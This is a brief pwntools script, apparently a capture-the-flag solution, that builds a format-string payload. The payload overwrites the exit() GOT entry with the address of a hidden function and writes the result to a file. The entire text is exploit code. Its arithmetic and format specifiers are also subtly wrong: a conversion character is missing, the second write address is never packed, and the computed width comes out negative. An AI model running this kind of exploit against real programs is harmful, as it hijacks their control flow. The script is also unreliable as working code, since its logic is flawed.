from pwn import *

exit_got = 0x804a020
hidden = 0x804857b


payload = p32(exit_got)
payload += ("%" + str((hidden & 0xffff) - 4) + "c").encode("utf-8")
payload += b"%11$hn"
payload += ("%" + str((hidden >> 16) - (hidden & 0xffff))).encode("utf-8")
payload += b"%12$hn"


f = open("exp", "wb")
f.write(payload)
f.close()